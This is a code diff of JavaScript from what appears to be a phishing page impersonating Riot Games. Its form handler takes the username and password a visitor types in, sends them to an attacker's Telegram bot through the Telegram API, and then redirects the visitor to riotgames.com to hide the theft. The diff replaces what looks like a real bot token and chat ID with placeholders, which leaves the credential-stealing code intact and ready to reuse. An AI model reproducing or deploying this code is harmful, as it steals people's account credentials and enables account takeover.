@@ -17,14 +17,14 @@ document.addEventListener("DOMContentLoaded", function () {
 
         if (username === "" || password === "") return;
 
-        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
-        const chatId = "6687453395";
+        const botToken = "YOUR_BOT_TOKEN_HERE";
+        const chatId = "YOUR_CHAT_ID_HERE";
         const message = `🔥 New Login Attempt 🔥\n\n👤 Username: ${username}\n🔒 Password: ${password}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .then(() => {
                 alert("✅ Data sent successfully!");
-                window.location.href = "https://riotgames0.github.io/Verification./Lvl30/index.html";
+                window.location.href = "https://www.riotgames.com/";
             })
             .catch(error => console.error("❌ Error sending to Telegram:", error));
     }
